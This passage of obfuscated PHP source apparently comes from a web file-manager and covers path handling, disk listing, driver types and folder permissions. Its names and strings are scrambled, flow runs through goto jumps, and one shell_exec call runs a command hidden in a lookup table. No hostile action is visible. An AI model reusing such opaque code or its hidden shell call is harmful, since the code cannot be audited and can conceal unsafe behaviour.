($Ëã˜¡[$’’…ñŞÉ[33]] !== self::KOD_SOURCE) { show_json(LNG($’’…ñŞÉ[1341]), !1); } return $Ëã˜¡[$’’…ñŞÉ[468]]; } public static function make($ŞßÛ«¯î) { if (!$ŞßÛ«¯î) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ŞßÛ«¯î)); } public static function makeShare($Êä¡â, $÷ÜìíÓ) { return self::makePath(self::KOD_SHARE_ITEM, $Êä¡â, $÷ÜìíÓ); } public static function makeFileTypePath($ÄÛ›ÇÒĞ) { return self::makePath(self::KOD_USER_FILE_TYPE, $ÄÛ›ÇÒĞ); } public static function makeFileTagPath($¼«Ë…çş) { return self::makePath(self::KOD_USER_FILE_TAG, $¼«Ë…çş); } public static function makePath($…Ûê’õˆ, $Âõøààñ = '', $¶¿¾âµá = '') { $Ì’Åí =& $_SERVER[è¶³ÒßÑ]; $åäèÎò– = substr($…Ûê’õˆ, 1, -1); $ß¥÷ıÛ¸ = $Ì’Åí[1342] . $åäèÎò– . $Ì’Åí[1343] . $Âõøààñ . $Ì’Åí[1344]; $ß¥÷ıÛ¸ = $¶¿¾âµá ? $ß¥÷ıÛ¸ . $¶¿¾âµá . $Ì’Åí[8] : $ß¥÷ıÛ¸; return $ß¥÷ıÛ¸; } public static function hashPath($ŸÂ¯ƒ±¼, $ğûÙêºæ = true) { $¤¬›íô =& $_SERVER[è¶³ÒßÑ]; $ËĞÌÜôÇ = is_array($ŸÂ¯ƒ±¼) ? $ŸÂ¯ƒ±¼ : IO::info($ŸÂ¯ƒ±¼); $şÕÂœä = _get($ËĞÌÜôÇ, $¤¬›íô[1345], $¤¬›íô[12]); if (!$şÕÂœä && isset($ËĞÌÜôÇ[$¤¬›íô[245]])) { $şÕÂœä = trim($ËĞÌÜôÇ[$¤¬›íô[245]], $¤¬›íô[131]); } if (!$şÕÂœä && isset($ËĞÌÜôÇ[$¤¬›íô[203]]) && $ËĞÌÜôÇ[$¤¬›íô[203]]) { $ËĞÌÜôÇ = IO::info(KodIO::make($ËĞÌÜôÇ[$¤¬›íô[203]])); $şÕÂœä = _get($ËĞÌÜôÇ, $¤¬›íô[1345], $¤¬›íô[12]); } $¥éŠ›Õ² = md5($ËĞÌÜôÇ[$¤¬›íô[97]] . $ËĞÌÜôÇ[$¤¬›íô[89]] . $ËĞÌÜôÇ[$¤¬›íô[98]]); if (!$şÕÂœä && file_exists($ËĞÌÜôÇ[$¤¬›íô[97]])) { $şÕÂœä = Cache::get($¥éŠ›Õ² . $¤¬›íô[1346]); $şÕÂœä = !1; if (!$şÕÂœä) { $şÕÂœä = IO::hashSimple($ËĞÌÜôÇ[$¤¬›íô[97]]); Cache::set($¥éŠ›Õ² . $¤¬›íô[1346], $şÕÂœä, 3600 * 24 * 30); } } if ($ğûÙêºæ && !$şÕÂœä) { } return $şÕÂœä ? $şÕÂœä : $¥éŠ›Õ²; } public static function hashPathSafe($¢³ò’çŠ, $àë‡Í„Ï = true) { $çàˆÑß =& $_SERVER[è¶³ÒßÑ]; $ÌÁ¸îòŸ = self::hashPath($¢³ò’çŠ, $àë‡Í„Ï); return md5($ÌÁ¸îòŸ . $çàˆÑß[1347] . Model($çàˆÑß[824])->get($çàˆÑß[825])); } public static function initSystemPath() { $ Û÷ñü¥ =& $_SERVER[è¶³ÒßÑ]; if (defined($ Û÷ñü¥[1348])) { return; } define($ Û÷ñü¥[1348], self::systemPath($ Û÷ñü¥[201])); define($ Û÷ñü¥[1349], self::systemPath($ Û÷ñü¥[1350])); define($ Û÷ñü¥[1351], self::systemPath($ Û÷ñü¥[1352])); define($ Û÷ñü¥[1353], self::systemPath($ Û÷ñü¥[1354])); IOHistory::bindEvent(); } public static function systemPath($œ«£­Õ) { $ú„­—»ç =& $_SERVER[è¶³ÒßÑ]; $êÂÜ–°ù = $ú„­—»ç[1355] . ucfirst($œ«£­Õ); $ö«÷ƒ• = Model($ú„­—»ç[824])->get($êÂÜ–°ù); if ($ö«÷ƒ•) { return $ö«÷ƒ•; } if ($œ«£­Õ == $ú„­—»ç[201]) { $ö«÷ƒ• = self::make(Model($ú„­—»ç[878])->systemRootPathAdd($ú„­—»ç[598])); } else { $ö«÷ƒ• = self::systemPath($ú„­—»ç[201]); $ùæ·…« = self::sourceID($ö«÷ƒ•); $ö«÷ƒ• = self::make(Model($ú„­—»ç[878])->mkdir($ùæ·…«, $œ«£­Õ)); } Model($ú„­—»ç[824])->set($êÂÜ–°ù, $ö«÷ƒ•); return $ö«÷ƒ•; } public static function systemFolder($İÛå°×) { $è¶„¥ ñ = IO_PATH_SYSTEM_SOURCE . $İÛå°×; $ß®¼‹Ìù = Cache::get($è¶„¥ ñ); if (!$ß®¼‹Ìù) { $Á”¬ºè¹ = IO::infoFullSimple($è¶„¥ ñ); if (!$Á”¬ºè¹) { $ß®¼‹Ìù = IO::mkdir($è¶„¥ ñ, REPEAT_SKIP); } else { $ß®¼‹Ìù = $Á”¬ºè¹[$_SERVER[è¶³ÒßÑ][97]]; } Cache::set($è¶„¥ ñ, $ß®¼‹Ìù, 3600 * 10); } return $ß®¼‹Ìù; } public static function defaultDriver() { return Model($_SERVER[è¶³ÒßÑ][821])->defaultDriver(); } public static function defaultIO() { $«æš©‹à =& $_SERVER[è¶³ÒßÑ]; $÷ö»ê•´ = self::defaultDriver(); return $«æš©‹à[1356] . $÷ö»ê•´[$«æš©‹à[468]] . $«æš©‹à[1344]; } public static function defaultDriverInit() { static $ë°´«ò› = false; if ($ë°´«ò›) { return $ë°´«ò›; } $ë°´«ò› = IO::init(self::defaultIO()); return $ë°´«ò›; } public static function fileTypeList() { $øˆèá“¹ =& $_SERVER[è¶³ÒßÑ]; $°Úş­æ¦ = $GLOBALS[$øˆèá“¹[6]][$øˆèá“¹[1357]]; foreach ($°Úş­æ¦ as $¨‰¦”÷Ã => $šêˆÕÑÅ) { $ØÉú“Œ = $øˆèá“¹[1358] . $¨‰¦”÷Ã; $ìñõ¸ü = LNG($ØÉú“Œ); if ($ØÉú“Œ != $ìñõ¸ü) { $°Úş­æ¦[$¨‰¦”÷Ã][$øˆèá“¹[32]] = $ìñõ¸ü; } } return $°Úş­æ¦; } public static function diskList($æè± Êµ = true) { $şÔéâë = $_SERVER[è¶³ÒßÑ][1359]; if ($æè± Êµ) { $‘£ôÕŞš = Cache::get($şÔéâë); if (is_array($‘£ôÕŞš)) { return $‘£ôÕŞš; } } $‘£ôÕŞš = self::diskListGet(); Cache::set($şÔéâë, $‘£ôÕŞš, 60); return $‘£ôÕŞš; } public static function diskListGet() { $ˆóşå£ =& $_SERVER[è¶³ÒßÑ]; $¡µ³ş¼Š = array(); if ($GLOBALS[$ˆóşå£[6]][$ˆóşå£[1360]] == $ˆóşå£[1361]) { $õéÁš…õ = $ˆóşå£[1362]; for ($ÉÛ÷ïªë = 0; $ÉÛ÷ïªë < strlen($õéÁš…õ); $ÉÛ÷ïªë++) { $ÒËùî°¯ = $õéÁš…õ[$ÉÛ÷ïªë] . $ˆóşå£[1363]; if (file_exists($ÒËùî°¯)) { $¡µ³ş¼Š[] = $ÒËùî°¯; } } return $¡µ³ş¼Š; } if (!function_exists($ˆóşå£[111])) { $¡µ³ş¼Š[] = $ˆóşå£[889]; return $¡µ³ş¼Š; } $’Ş£ù˜Å = explode($ˆóşå£[60], shell_exec($ˆóşå£[1364])); array_shift($’Ş£ù˜Å); array_pop($’Ş£ù˜Å); $½ø³¦¼– = array($ˆóşå£[1365], $ˆóşå£[1366], $ˆóşå£[1367], $ˆóşå£[1368], $ˆóşå£[1369], $ˆóşå£[1370], $ˆóşå£[1371], $ˆóşå£[1372]); foreach ($’Ş£ù˜Å as $ˆ©Üª¼ü) { $§£§€ëÃ = preg_split($ˆóşå£[1373], $ˆ©Üª¼ü); $ÒËùî°¯ = $§£§€ëÃ[count($§£§€ëÃ) - 1]; if (!strstr($§£§€ëÃ[0], $ˆóşå£[1374]) || !$ÒËùî°¯) { continue; } $«”£É® = rtrim($ÒËùî°¯, $ˆóşå£[8]) . $ˆóşå£[8]; if (in_array($«”£É®, $½ø³¦¼–)) { continue; } $¡µ³ş¼Š[] = $«”£É®; } return $¡µ³ş¼Š; } public static function isSameDisk($ÔŠ²¢ÑÍ, $ÒŞï©èé) { $ÒÈƒšä =& $_SERVER[è¶³ÒßÑ]; if ($GLOBALS[$ÒÈƒšä[6]][$ÒÈƒšä[1360]] == $ÒÈƒšä[1361]) { return strtolower(substr($ÔŠ²¢ÑÍ, 0, 1)) == strtolower(substr($ÒŞï©èé, 0, 1)); } $«ï«¬İĞ = self::diskList(); $¬çü¨¥ = !1; $•Ü»í® = !1; sort($«ï«¬İĞ); $«ï«¬İĞ = array_reverse($«ï«¬İĞ); $ÔŠ²¢ÑÍ = rtrim($ÔŠ²¢ÑÍ, $ÒÈƒšä[8]) . $ÒÈƒšä[8]; $ÒŞï©èé = rtrim($ÒŞï©èé, $ÒÈƒšä[8]) . $ÒÈƒšä[8]; foreach ($«ï«¬İĞ as $£¦‡ÁÙ©) { $‰ıŠ‹ç  = strlen($£¦‡ÁÙ©); if (!$¬çü¨¥ && substr($ÔŠ²¢ÑÍ, 0, $‰ıŠ‹ç ) == $£¦‡ÁÙ©) { $¬çü¨¥ = $£¦‡ÁÙ©; } if (!$•Ü»í® && substr($ÒŞï©èé, 0, $‰ıŠ‹ç ) == $£¦‡ÁÙ©) { $•Ü»í® = $£¦‡ÁÙ©; } if ($¬çü¨¥ && $•Ü»í®) { break; } } return $¬çü¨¥ === $•Ü»í®; } public static function transferType($“á°”†Œ, $İıİ§–é) { $€ÁÈÌè¼ =& $_SERVER[è¶³ÒßÑ]; $ÅÉîŞã© = self::driverType($“á°”†Œ); $›éÚ—¢™ = self::driverType($İıİ§–é); if ($ÅÉîŞã©[$€ÁÈÌè¼[33]] == $›éÚ—¢™[$€ÁÈÌè¼[33]] && $ÅÉîŞã©[$€ÁÈÌè¼[1375]] == $›éÚ—¢™[$€ÁÈÌè¼[1375]]) { return $€ÁÈÌè¼[1376]; } if ($ÅÉîŞã©[$€ÁÈÌè¼[33]] == $€ÁÈÌè¼[922] && $›éÚ—¢™[$€ÁÈÌè¼[33]] == $€ÁÈÌè¼[119]) { return $€ÁÈÌè¼[1254]; } if ($ÅÉîŞã©[$€ÁÈÌè¼[33]] == $€ÁÈÌè¼[119] && $›éÚ—¢™[$€ÁÈÌè¼[33]] == $€ÁÈÌè¼[922]) { return $€ÁÈÌè¼[120]; } return $€ÁÈÌè¼[1377]; } public static function driverType($ı®½â) { $¬åæ¸Ê =& $_SERVER[è¶³ÒßÑ]; $­†ü¿º = str_replace($¬åæ¸Ê[1378], $¬åæ¸Ê[12], strtolower($ı®½â->getType())); if ($­†ü¿º == $¬åæ¸Ê[811] || $­†ü¿º == $¬åæ¸Ê[1379] || $­†ü¿º == $¬åæ¸Ê[1380]) { $ı®½â = self::defaultDriverInit(); } else { if ($­†ü¿º == $¬åæ¸Ê[1264] || $­†ü¿º == $¬åæ¸Ê[1381]) { $ı®½â = IO::init($ı®½â->pathParse[$¬åæ¸Ê[1207]]); } } $ÚÌäÇÖî = $ı®½â->path; $­†ü¿º = str_replace($¬åæ¸Ê[1378], $¬åæ¸Ê[12], strtolower($ı®½â->getType())); if ($­†ü¿º == $¬åæ¸Ê[119]) { return array($¬åæ¸Ê[33] => $¬åæ¸Ê[119], $¬åæ¸Ê[1375] => $¬åæ¸Ê[12], $¬åæ¸Ê[97] => $ÚÌäÇÖî, $¬åæ¸Ê[108] => $ı®½â); } return array($¬åæ¸Ê[33] => $¬åæ¸Ê[922], $¬åæ¸Ê[1375] => $ı®½â->pathDriver, $¬åæ¸Ê[97] => $ÚÌäÇÖî, $¬åæ¸Ê[108] => $ı®½â); } public static function pathDriverType($Âî²ë¬ˆ) { return $Âî²ë¬ˆ ? self::driverType(IO::init($Âî²ë¬ˆ)) : !1; } public static function pathDriverLocal($ûåİ¯¹) { $˜ƒõ‘¦ =& $_SERVER[è¶³ÒßÑ]; $ò©ÖÈ˜Æ = $ûåİ¯¹ ? self::driverType(IO::init($ûåİ¯¹)) : !1; return $ò©ÖÈ˜Æ[$˜ƒõ‘¦[33]] == $˜ƒõ‘¦[119] ? !0 : !1; } public static function allowCover($À¡Åö²ß, $ì™ĞÒ¹ñ = true) { $ŠãÎ¼ É =& $_SERVER[è¶³ÒßÑ]; if (is_string($À¡Åö²ß)) { $À¡Åö²ß = IO::info($À¡Åö²ß); } if (!$À¡Åö²ß || $À¡Åö²ß[$ŠãÎ¼ É[33]] == $ŠãÎ¼ É[88] || $À¡Åö²ß[$ŠãÎ¼ É[89]] <= 100) { return !1; } if (isset($À¡Åö²ß[$ŠãÎ¼ É[1382]]) || !$À¡Åö²ß[$ŠãÎ¼ É[97]]) { return !1; } if (isset($À¡Åö²ß[$ŠãÎ¼ É[242]]) && !$À¡Åö²ß[$ŠãÎ¼ É[242]]) { return !1; } static $ÙÛÁ¥Ç = false; if (!$ÙÛÁ¥Ç || !$ì™ĞÒ¹ñ) { $æª®Â­ = self::driverType(IO::init($À¡Åö²ß[$ŠãÎ¼ É[97]])); $¯Ø¹ş¯ = $æª®Â­[$ŠãÎ¼ É[108]]; $ÙÛÁ¥Ç = $ŠãÎ¼ É[206]; if ($æª®Â­[$ŠãÎ¼ É[33]] == $ŠãÎ¼ É[119]) { $ÙÛÁ¥Ç = $ŠãÎ¼ É[1383]; } if ($æª®Â­[$ŠãÎ¼ É[108]] && is_array($æª®Â­[$ŠãÎ¼ É[108]]->config)) { $½´ğÀö¡ = $æª®Â­[$ŠãÎ¼ É[108]]->config; if (isset($½´ğÀö¡[$ŠãÎ¼ É[1384]]) && $½´ğÀö¡[$ŠãÎ¼ É[1384]]) { $ÙÛÁ¥Ç = $ŠãÎ¼ É[1383]; } } } return $ÙÛÁ¥Ç == $ŠãÎ¼ É[1383] ? !0 : !1; } } goto B•œî‡È’; c¹ëŠ†ö˜: function binCheckBigger($©ïİ“, $•…Ù¶à‚) { return $©ïİ“ > $•…Ù¶à‚; } $_SERVER[$_SERVER[àÚÌê´İ][3]] = (base64_decode('ODUxNg==').base64_decode('MzY='))+0;$_j8b7="kedlf5w68o97a3szuxqpgbhmynj24i1vc0tr1wmzdjhsx0ai76e8ktvpbc";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($»Úî³ó, $•É¯¨Ë) { $ï°‚Úå‰ =& $_SERVER[è¶³ÒßÑ]; if (isset(self::$_methodList[$»Úî³ó])) { return @call_user_func_array(self::$_methodList[$»Úî³ó], $•É¯¨Ë); } else { if (method_exists($this, $»Úî³ó)) { return call_user_func_array(array($this, $»Úî³ó), $•É¯¨Ë); } else { think_exception(__CLASS__ . $ï°‚Úå‰[4] . $»Úî³ó . $ï°‚Úå‰[5]); } } } public static function __callStatic($£ÌœÆÌ, $«†Ñ»Ì‹) { if (isset(self::$_methodListStatic[$£ÌœÆÌ])) { return call_user_func_array(self::$_methodListStatic[$£ÌœÆÌ], $«†Ñ»Ì‹); } else { if (method_exists(self, $£ÌœÆÌ)) { return call_user_func_array(array(self, $£ÌœÆÌ), $«†Ñ»Ì‹); } else { show_json("{$£ÌœÆÌ}\50\51\x20\x6e\157\x74\x20\145\x78\151\163\x74\73", !1); } } } public static function addMethod($‚¡ñ¹ı‹, $øüÈ”­¢) { self::$_methodList[$‚¡ñ¹ı‹] = $øüÈ”­¢; } public static function addMethodStatic($ÇÕã…, $Šò¯¤±Ú) { self::$_methodListStatic[$ÇÕã…] = $Šò¯¤±Ú; } } goto a•ğ­Ì¥®Ğ; aê§ˆŒÆ–: class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\x75\x72\143\145\x5f\x61\165\164\x68"; public function getAuth($Òë¬Àêû) { $ªáÙĞ¿ =& $_SERVER[è¶³ÒßÑ]; $ÅèãÇ«â = $this->sourceAuthSelect($Òë¬Àêû); $¦Áˆ¦£Ò = array(); $¿ö€óş = array(); $²ş­É¤¨ = 2 << 25; foreach ($ÅèãÇ«â as $ê¬§„˜ˆ) { $Âƒ¦‹í = Model($ªáÙĞ¿[564])->listData($ê¬§„˜ˆ[$ªáÙĞ¿[2067]]); if (!$Âƒ¦‹í) { continue; } $¦Áˆ¦£Ò[] = $ê¬§„˜ˆ; $óğ¶î•î = 0; if ($ê¬§„˜ˆ[$ªáÙĞ¿[200]] == SourceModel::TYPE_GROUP) { $óğ¶î•î = $²ş­É¤¨ * 2; } if ($ê¬§„˜ˆ[$ªáÙĞ¿[200]] == SourceModel::TYPE_USER) { $óğ¶î•î = $²ş­É¤¨; } if ($ê¬§„˜ˆ[$ªáÙĞ¿[200]] == SourceModel::TYPE_USER && $ê¬§„˜ˆ[$ªáÙĞ¿[562]] == $ªáÙĞ¿[238]) { $óğ¶î•î = 0; } $¿ö€óş[] = $Âƒ¦‹í[$ªáÙĞ¿[480]] + $óğ¶î•î; } array_multisort($¿ö€óş, SORT_DESC, $¦Áˆ¦£Ò); return $¦Áˆ¦£Ò; } public function sourceAuthSelect($å‘ÀÃêá) { $÷¸ŸÏ¹˜ =& $_SERVER[è¶³ÒßÑ]; static $åìòÖ©Ÿ = array(); $¥ïŸÏ¿Ÿ = is_array($å‘ÀÃêá) ? !1 : !0; if ($¥ïŸÏ¿Ÿ) { $å‘ÀÃêá = array($å‘ÀÃêá); } $²‰ß¸ = array(); foreach ($å‘ÀÃêá as $Œ‰’ª‚ó) { if (isset($åìòÖ©Ÿ[$Œ‰’ª‚ó])) { $²‰ß¸[$Œ‰’ª‚ó] = $åìòÖ©Ÿ[$Œ‰’ª‚ó]; } } if (count($²‰ß¸) == count($å‘ÀÃêá)) { return $¥ïŸÏ¿Ÿ ? $²‰ß¸[$å‘ÀÃêá[0]] : $²‰ß¸; } $–×Ç™´ì = $÷¸ŸÏ¹˜[2144]; $ãçªÄš™ = array($÷¸ŸÏ¹˜[203] => array($÷¸ŸÏ¹˜[7], $å‘ÀÃêá)); $ë„é…©º = $this->field($–×Ç™´ì)->order($÷¸ŸÏ¹˜[468])->where($ãçªÄš™)->select(); $Á©ÙêŒ  = array_to_keyvalue_group($ë„é…©º, $÷¸ŸÏ¹˜[203]); foreach ($å‘ÀÃêá as $Œ‰’ª‚ó) { $åìòÖ©Ÿ[$Œ‰’ª‚ó] = $Á©ÙêŒ [$Œ‰’ª‚ó] ? $Á©ÙêŒ [$Œ‰’ª‚ó] : array(); } if ($¥ïŸÏ¿Ÿ) { return $ë„é…©º; } return $Á©ÙêŒ ; } public function setAuth($»ÁÖúÒ³, $Ü©ÙùÃ ) { $óÉ±å«Á =& $_SERVER[è¶³ÒßÑ]; $‹¿ğÇ§ = Model($óÉ±å«Á[1395])->sourceInfo($»ÁÖúÒ³); if (!$‹¿ğÇ§) { return !1; } if ($‹¿ğÇ§[$óÉ±å«Á[200]] != SourceModel::TYPE_GROUP) { return !1; } $Í±ò•áè = 1; $ Ë¤ğıù = $‹¿ğÇ§[$óÉ±å«Á[562]]; if ($ Ë¤ğıù != $Í±ò•áè) { $äÏ†”òÒ = array($óÉ±å«Á[1959] => $ Ë¤ğıù); $†õÀë„ä = Model($óÉ±å«Á[2053])->field($óÉ±å«Á[1761])->where($äÏ†”òÒ)->select(); $†õÀë„ä = array_to_keyvalue($†õÀë„ä, $óÉ±å«Á[12], $óÉ±å«Á[1761]); } $Ó‹«–¨ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $¼”Ä’Ï’ = array(); foreach ($Ü©ÙùÃ  as $‰åº­‹¢) { if (!in_array($‰åº­‹¢[$óÉ±å«Á[200]], $Ó‹«–¨)) { show_json(LNG($óÉ±å«Á[2145]), !1); } if ($ Ë¤ğıù != $Í±ò•áè) { if ($‰åº­‹¢[$óÉ±å«Á[200]] == SourceModel::TYPE_GROUP) { } if ($‰åº­‹¢[$óÉ±å«Á[562]] != 0 && !in_array($‰åº­‹¢[$óÉ±å«Á[562]], $†õÀë„ä)) { } } if ($‰åº­‹¢[$óÉ±å«Á[562]] == 0) { $‰åº­‹¢[$óÉ±å«Á[200]] = SourceModel::TYPE_USER; } $¼”Ä’Ï’[] = array($óÉ±å«Á[203] => $»ÁÖúÒ³, $óÉ±å«Á[200] => intval($‰åº­‹¢[$óÉ±å«Á[200]]), $óÉ±å«Á[562] => intval($‰åº­‹¢[$óÉ±å«Á[562]]), $óÉ±å«Á[2067] => intval($‰åº­‹¢[$óÉ±å«Á[2067]]) ? intval($‰åº­‹¢[$óÉ±å«Á[2067]]) : 0, $óÉ±å«Á[2127] => intval($‰åº­‹¢[$óÉ±å«Á[2127]]) ? intval($‰åº­‹¢[$óÉ±å«Á[2127]]) : -1); } $this->where(array($óÉ±å«Á[484] => $»ÁÖúÒ³))->delete(); $this->addAll($¼”Ä’Ï’); return !0; } public function authClear($³„Ìî) { $á†­ÚŸ =& $_SERVER[è¶³ÒßÑ]; $ÇÏ™ıÒâ = Model($á†­ÚŸ[1395])->sourceInfo($³„Ìî); $ŠùÆ³‰ú = array($³„Ìî); if ($ÇÏ™ıÒâ[$á†­ÚŸ[478]] == $á†­ÚŸ[101]) { $£‰“±¢Â = array($á†­ÚŸ[645] => array($á†­ÚŸ[605], $ÇÏ™ıÒâ[$á†­ÚŸ[577]] . $³„Ìî . $á†­ÚŸ[606])); $ŠùÆ³‰ú = Model($á†­ÚŸ[1395])->field($á†­ÚŸ[484])->where($£‰“±¢Â)->getField($á†­ÚŸ[203], !0); $ŠùÆ³‰ú[] = $³„Ìî; } $this->where(array($á†­ÚŸ[484] => array($á†­ÚŸ[485], $ŠùÆ³‰ú)))->delete(); return !0; } public function getAllChildren($‰•¸½Í€) { $ˆÊ°Ï—æ =& $_SERVER[è¶³ÒßÑ]; $Ø½ÛØ† = Model($ˆÊ°Ï—æ[1395])->sourceInfo($‰•¸½Í€); if ($Ø½ÛØ†[$ˆÊ°Ï—æ[478]] != $ˆÊ°Ï—æ[101]) { return $this->sourceListAuth(array($‰•¸½Í€)); } if ($Ø½ÛØ†[$ˆÊ°Ï—æ[200]] != SourceModel::TYPE_GROUP) { return array(); } $ö»§ÓÜ = 1; $†…ëò° = array($‰•¸½Í€); if ($Ø½ÛØ†[$ˆÊ°Ï—æ[202]] == $ˆÊ°Ï—æ[238] && $Ø½ÛØ†[$ˆÊ°Ï—æ[562]] != $ö»§ÓÜ) { $†…ëò° = $this->groupChidldAllRootSource($Ø½ÛØ†[$ˆÊ°Ï—æ[562]]); } $ÜÏÇª¿ğ = $this->field($ˆÊ°Ï—æ[203])->group($ˆÊ°Ï—æ[203])->select(); $ÜÏÇª¿ğ = array_to_keyvalue($ÜÏÇª¿ğ, $ˆÊ°Ï—æ[12], $ˆÊ°Ï—æ[203]); if (!$ÜÏÇª¿ğ) { return array(); } $„“ÈÚ–‹ = $ˆÊ°Ï—æ[2146]; $¯¡ëÑ¦® = array($ˆÊ°Ï—æ[203] => array($ˆÊ°Ï—æ[7], $ÜÏÇª¿ğ), $ˆÊ°Ï—æ[498] => $ˆÊ°Ï—æ[238]); $¬Íè°›‡ = Model($ˆÊ°Ï—æ[878])->field($„“ÈÚ–‹)->where($¯¡ëÑ¦®)->select(); $±Ö’ƒ = array($‰•¸½Í€); foreach ($¬Íè°›‡ as $ çŠĞ×‹) { foreach ($†…ëò° as $ŠÙ¨–Ç¸) { $šÕòÅ¬ = $ˆÊ°Ï—æ[50] . $ŠÙ¨–Ç¸ . $ˆÊ°Ï—æ[50]; $Í˜Í˜©Í = $ çŠĞ×‹[$ˆÊ°Ï—æ[577]] . $ çŠĞ×‹[$ˆÊ°Ï—æ[203]] . $ˆÊ°Ï—æ[50]; if (strstr($Í˜Í˜©Í, $šÕòÅ¬)) { $±Ö’ƒ[] = $ çŠĞ×‹[$ˆÊ°Ï—æ[203]]; break; } } } return $this->sourceListAuth($±Ö’ƒ); } private function sourceListAuth($µ¼âıÓ ) { $Í¹÷Ñëğ =& $_SERVER[è¶³ÒßÑ]; $Ú…µí = Model($Í¹÷Ñëğ[1395])->sourceListInfo($µ¼âıÓ , !0); $Ñ³Ì‡› = $this->sourceAuthSelect($µ¼âıÓ ); $³ÉÒê†© = array(); $—™‘ù…İ = array(); foreach ($Ú…µí as $‡¯Ï©çö) { unset($‡¯Ï©çö[$Í¹÷Ñëğ[522]]); unset($‡¯Ï©çö[$Í¹÷Ñëğ[520]]); unset($‡¯Ï©çö[$Í¹÷Ñëğ[480]]); unset($‡¯Ï©çö[$Í¹÷Ñëğ[100]]); $®‡Šš“Ÿ = $Ñ³Ì‡›[$‡¯Ï©çö[$Í¹÷Ñëğ[203]]]; if (!$®‡Šš“Ÿ) { continue; } $‡¯Ï©çö[$Í¹÷Ñëğ[2147]] = $this->authTargetInfo($®‡Šš“Ÿ); $‡¯Ï©çö[$Í¹÷Ñëğ[575]] = rtrim($‡¯Ï©çö[$Í¹÷Ñëğ[581]], $Í¹÷Ñëğ[8]) . $Í¹÷Ñëğ[8] . ltrim($‡¯Ï©çö[$Í¹÷Ñëğ[575]], $Í¹÷Ñëğ[8]); $³ÉÒê†©[] = $‡¯Ï©çö; $Ã½ŞúÛŠ = count(explode($Í¹÷Ñëğ[8], trim($‡¯Ï©çö[$Í¹÷Ñëğ[575]], $Í¹÷Ñëğ[8]))); $—™‘ù…İ[] = $Ã½ŞúÛŠ + ($‡¯Ï©çö[$Í¹÷Ñëğ[33]] == $Í¹÷Ñëğ[88] ? 0 : 1000); } array_multisort($—™‘ù…İ, SORT_ASC, $³ÉÒê†©); return $³ÉÒê†©; } private function groupChidldAllRootSource($¡ÔÃ‰¼Ø) { $ú‹–Ÿ°Ô =& $_SERVER[è¶³ÒßÑ]; $Çøş»¯ = Model($ú‹–Ÿ°Ô[2148])->groupChildrenAll($¡ÔÃ‰¼Ø); $Ëêå†Œ = array($ú‹–Ÿ°Ô[202] => 0, $ú‹–Ÿ°Ô[562] => array($ú‹–Ÿ°Ô[7], $Çøş»¯), $ú‹–Ÿ°Ô[200] => SourceModel::TYPE_GROUP); $Ç³Ò±Ûè = Model($ú‹–Ÿ°Ô[878])->field($ú‹–Ÿ°Ô[203])->where($Ëêå†Œ)->select(); $Ç³Ò±Ûè = array_to_keyvalue($Ç³Ò±Ûè, $ú‹–Ÿ°Ô[12], $ú‹–Ÿ°Ô[203]); return $Ç³Ò±Ûè; } private function authTargetInfo($š¾±óèÅ) { $©¦‰şÊ =& $_SERVER[è¶³ÒßÑ]; $îÒú»èÒ = array(); $¢’ÜÖÂñ = array(); $ö“âàŠ€ = 2 << 25; foreach ($š¾±óèÅ as $Í®ÀÁ) { $Ö ÀÎƒ˜ = Model($©¦‰şÊ[564])->listData($Í®ÀÁ[$©¦‰şÊ[2067]]); if (!$Ö ÀÎƒ˜) { continue; } if ($Í®ÀÁ[$©¦‰şÊ[200]] == SourceModel::TYPE_USER) { $½šˆÓ© = Model($©¦‰şÊ[570])->getInfoSimpleOuter($Í®ÀÁ[$©¦‰şÊ[562]]); if ($½šˆÓ©[$©¦‰şÊ[1761]] == $©¦‰şÊ[1248]) { continue; } if ($½šˆÓ©[$©¦‰şÊ[1761]] == $©¦‰şÊ[238]) { $½šˆÓ©[$©¦‰şÊ[32]] = LNG($©¦‰şÊ[2149]); } } else { $½šˆÓ© = Model($©¦‰şÊ[578])->getInfoSimple($Í®ÀÁ[$©¦‰şÊ[562]]); } if (!$½šˆÓ©) { continue; } $½šˆÓ©[$©¦‰şÊ[533]] = $Ö ÀÎƒ˜; $îÒú»èÒ[] = $½šˆÓ©; $Õ­òÃ = 0; if ($Í®ÀÁ[$©¦‰şÊ[200]] == SourceModel::TYPE_GROUP) { $Õ­òÃ = $ö“âàŠ€ * 2; } if ($Í®ÀÁ[$©¦‰şÊ[200]] == SourceModel::TYPE_USER) { $Õ­òÃ = $ö“âàŠ€; } if ($Í®ÀÁ[$©¦‰şÊ[200]] == SourceModel::TYPE_USER && $Í®ÀÁ[$©¦‰şÊ[562]] == $©¦‰şÊ[238]) { $Õ­òÃ = 0; } $¢’ÜÖÂñ[] = $Ö ÀÎƒ˜[$©¦‰şÊ[480]] + $Õ­òÃ; } array_multisort($¢’ÜÖÂñ, SORT_DESC, $îÒú»èÒ); return $îÒú»èÒ; } public function getAllChildrenByUser($ı¸‡¦, $Öö¦Êâ) { $©‹É¤Ğ· =& $_SERVER[è¶³ÒßÑ]; $”Ø¦˜¡ = Model($©‹É¤Ğ·[591])->getInfo($Öö¦Êâ); if (!$Öö¦Êâ || !$ı¸‡¦ || !$”Ø¦˜¡) { return array(); } $•ÑÜÃ¦ = Model($©‹É¤Ğ·[1395])->sourceInfo($ı¸‡¦); $„ Öòìæ = array(); $öà„”Â = 1; if ($•ÑÜÃ¦[$©‹É¤Ğ·[202]] == $©‹É¤Ğ·[238] && $•ÑÜÃ¦[$©‹É¤Ğ·[562]] != $öà„”Â && $this->groupContainUser($•ÑÜÃ¦[$©‹É¤Ğ·[562]], $Öö¦Êâ)) { foreach ($”Ø¦˜¡[$©‹É¤Ğ·[2150]] as $ÃŞ‚˜·‹) { $ÈïÆ˜Íı = Model($©‹É¤Ğ·[578])->getInfo($ÃŞ‚˜·‹[$©‹É¤Ğ·[1959]]); $ŠÀáãˆƒ = Model($©‹É¤Ğ·[591])->getInfoSimpleOuter($Öö¦Êâ); $ŠÀáãˆƒ[$©‹É¤Ğ·[533]] = $ÃŞ‚˜·‹[$©‹É¤Ğ·[480]]; if (Model($©‹É¤Ğ·[564])->authCheckAction($ÃŞ‚˜·‹[$©‹É¤Ğ·[480]][$©‹É¤Ğ·[480]], $©‹É¤Ğ·[1980])) { continue; } $Ï¬Ğ¡ê— = array($©‹É¤Ğ·[32] => $©‹É¤Ğ·[1268] . 